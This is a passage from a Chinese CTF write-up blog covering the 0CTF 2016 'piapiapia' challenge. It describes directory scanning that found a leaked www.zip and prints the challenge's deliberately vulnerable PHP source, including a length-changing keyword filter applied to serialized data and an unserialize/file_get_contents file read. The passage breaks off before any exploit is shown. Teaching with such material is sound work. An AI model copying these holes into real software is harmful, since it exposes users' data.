class="line">index.php?<span class="type">key</span>=<span class="number">123</span></span><br></pre></td></tr></table></figure></p><p>直接得到flag</p><h1 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h1><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>打开之后是一个登录界面，尝试了一下sql注入发现有关键字被过滤了，之后又尝试了一下万能密码，同时对其进行了目录扫描，发现有www.zip的文件泄露，下载打开源码</p><p>index.php:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>]) &#123;</span></span><br><span class="line"><span class="php">header(<span class="string">'Location: profile.php'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">exit</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($_POST[<span class="string">'username'</span>] &amp;&amp; $_POST[<span class="string">'password'</span>]) &#123;</span></span><br><span class="line"><span class="php">$username = $_POST[<span class="string">'username'</span>];</span></span><br><span class="line"><span class="php">$password = $_POST[<span class="string">'password'</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>(strlen($username) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen($username) &gt; <span class="number">16</span>) </span></span><br><span class="line"><span class="php"><span class="keyword">die</span>(<span class="string">'Invalid user name'</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>(strlen($password) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen($password) &gt; <span class="number">16</span>) </span></span><br><span class="line"><span class="php"><span class="keyword">die</span>(<span class="string">'Invalid password'</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>($user-&gt;login($username, $password)) &#123;</span></span><br><span class="line"><span class="php">$_SESSION[<span class="string">'username'</span>] = $username;</span></span><br><span class="line"><span class="php">header(<span class="string">'Location: profile.php'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">exit</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php"><span class="keyword">die</span>(<span class="string">'Invalid user name or password'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">title</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"static/bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"static/jquery.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"static/bootstrap.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span> <span class="attr">style</span>=<span class="string">"margin-top:100px"</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"index.php"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">class</span>=<span class="string">"well"</span> <span class="attr">style</span>=<span class="string">"width:220px;margin:0px auto;"</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"static/piapiapia.gif"</span> <span class="attr">class</span>=<span class="string">"img-memeda "</span> <span class="attr">style</span>=<span class="string">"width:180px;margin:0px auto;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span>Username:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">style</span>=<span class="string">"height:30px"</span><span class="attr">class</span>=<span class="string">"span3"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span>Password:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">style</span>=<span class="string">"height:30px"</span> <span class="attr">class</span>=<span class="string">"span3"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span>LOGIN<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>class.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'config.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span> <span class="keyword">extends</span> <span class="title">mysql</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $table = <span class="string">'users'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_exists</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line"></span><br><span class="line">$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">$password = <span class="keyword">parent</span>::filter($password);</span><br><span class="line"></span><br><span class="line">$key_list = <span class="keyword">Array</span>(<span class="string">'username'</span>, <span class="string">'password'</span>);</span><br><span class="line">$value_list = <span class="keyword">Array</span>($username, md5($password));</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">parent</span>::insert(<span class="keyword">$this</span>-&gt;table, $key_list, $value_list);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">$password = <span class="keyword">parent</span>::filter($password);</span><br><span class="line"></span><br><span class="line">$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">$object = <span class="keyword">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line"><span class="keyword">if</span> ($object &amp;&amp; $object-&gt;password === md5($password)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line"></span><br><span class="line">$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">$object = <span class="keyword">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line"><span class="keyword">return</span> $object-&gt;profile;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span><span class="params">($username, $new_profile)</span> </span>&#123;</span><br><span class="line">$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">$new_profile = <span class="keyword">parent</span>::filter($new_profile);</span><br><span class="line"></span><br><span class="line">$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">'profile'</span>, $new_profile, $where);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> $link = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span><span class="params">($config)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;link = mysql_connect(</span><br><span class="line">$config[<span class="string">'hostname'</span>],</span><br><span class="line">$config[<span class="string">'username'</span>], </span><br><span class="line">$config[<span class="string">'password'</span>]</span><br><span class="line">);</span><br><span class="line">mysql_select_db($config[<span class="string">'database'</span>]);</span><br><span class="line">mysql_query(<span class="string">"SET sql_mode='strict_all_tables'"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;link;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span><span class="params">($table, $where, $ret = <span class="string">'*'</span>)</span> </span>&#123;</span><br><span class="line">$sql = <span class="string">"SELECT $ret FROM $table WHERE $where"</span>;</span><br><span class="line">$result = mysql_query($sql, <span class="keyword">$this</span>-&gt;link);</span><br><span class="line"><span class="keyword">return</span> mysql_fetch_object($result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span><span class="params">($table, $key_list, $value_list)</span> </span>&#123;</span><br><span class="line">$key = implode(<span class="string">','</span>, $key_list);</span><br><span class="line">$value = <span class="string">'\''</span> . implode(<span class="string">'\',\''</span>, $value_list) . <span class="string">'\''</span>; </span><br><span class="line">$sql = <span class="string">"INSERT INTO $table ($key) VALUES ($value)"</span>;</span><br><span class="line"><span class="keyword">return</span> mysql_query($sql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">($table, $key, $value, $where)</span> </span>&#123;</span><br><span class="line">$sql = <span class="string">"UPDATE $table SET $key = '$value' WHERE $where"</span>;</span><br><span class="line"><span class="keyword">return</span> mysql_query($sql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">$escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>);</span><br><span class="line">$escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>;</span><br><span class="line">$string = preg_replace($escape, <span class="string">'_'</span>, $string);</span><br><span class="line"></span><br><span class="line">$safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">$safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line"><span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">session_start();</span><br><span class="line">$user = <span class="keyword">new</span> user();</span><br><span class="line">$user-&gt;connect($config);</span><br></pre></td></tr></table></figure></p><p>config.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$config[<span class="string">'hostname'</span>] = <span class="string">'127.0.0.1'</span>;</span></span><br><span class="line"><span class="php">$config[<span class="string">'username'</span>] = <span class="string">'root'</span>;</span></span><br><span class="line"><span class="php">$config[<span class="string">'password'</span>] = <span class="string">''</span>;</span></span><br><span class="line"><span class="php">$config[<span class="string">'database'</span>] = <span class="string">''</span>;</span></span><br><span class="line"><span class="php">$flag = <span class="string">''</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>profile.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] == <span class="keyword">null</span>) &#123;</span></span><br><span class="line"><span class="php"><span class="keyword">die</span>(<span class="string">'Login First'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$username = $_SESSION[<span class="string">'username'</span>];</span></span><br><span class="line"><span class="php">$profile=$user-&gt;show_profile($username);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($profile  == <span class="keyword">null</span>) &#123;</span></span><br><span class="line"><span class="php">header(<span class="string">'Location: update.php'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">$profile = unserialize($profile);</span></span><br><span class="line"><span class="php">$phone = $profile[<span class="string">'phone'</span>];</span></span><br><span class="line"><span class="php">$email = $profile[<span class="string">'email'</span>];</span></span><br><span class="line"><span class="php">$nickname = $profile[<span class="string">'nickname'</span>];</span></span><br><span class="line"><span class="php">$photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]));</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">title</span>&gt;</span>Profile<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"static/bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"static/jquery.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"static/bootstrap.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span> <span class="attr">style</span>=<span class="string">"margin-top:100px"</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"data:image/gif;base64,&lt;?php echo $photo; ?&gt;"</span> <span class="attr">class</span>=<span class="string">"img-memeda "</span> <span class="attr">style</span>=<span class="string">"width:180px;margin:0px auto;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>Hi <span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $nickname;<span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span>Phone: <span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $phone;<span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span>Email: <span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $email;<span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>register.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($_POST[<span class="string">'username'</span>] &amp;&amp; $_POST[<span class="string">'password'</span>]) &#123;</span></span><br><span class="line"><span class="php">$username = $_POST[<span class="string">'username'</span>];</span></span><br><span class="line"><span class="php">$password = $_POST[<span class="string">'password'</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>(strlen($username) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen($username) &gt; <span class="number">16</span>) </span></span><br><span class="line"><span class="php"><span class="keyword">die</span>(<span class="string">'Invalid user name'</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>(strlen($password) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen($password) &gt; <span class="number">16</span>) </span></span><br><span class="line"><span class="php"><span class="keyword">die</span>(<span class="string">'Invalid password'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!$user-&gt;is_exists($username)) &#123;</span></span><br><span class="line"><span class="php">$user-&gt;register($username, $password);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'Register OK!&lt;a href="index.php"&gt;Please Login&lt;/a&gt;'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php"><span class="keyword">die</span>(<span class="string">'User name Already Exists'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">title</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"static/bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"static/jquery.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"static/bootstrap.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span> <span class="attr">style</span>=<span class="string">"margin-top:100px"</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"register.php"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">class</span>=<span class="string">"well"</span> <span class="attr">style</span>=<span class="string">"width:220px;margin:0px auto;"</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"static/piapiapia.gif"</span> <span class="attr">class</span>=<span class="string">"img-memeda "</span> <span class="attr">style</span>=<span class="string">"width:180px;margin:0px auto;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>Register<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span>Username:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">style</span>=<span class="string">"height:30px"</span><span class="attr">class</span>=<span class="string">"span3"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span>Password:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">style</span>=<span class="string">"height:30px"</span> <span class="attr">class</span>=<span class="string">"span3"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span>REGISTER<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>update.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 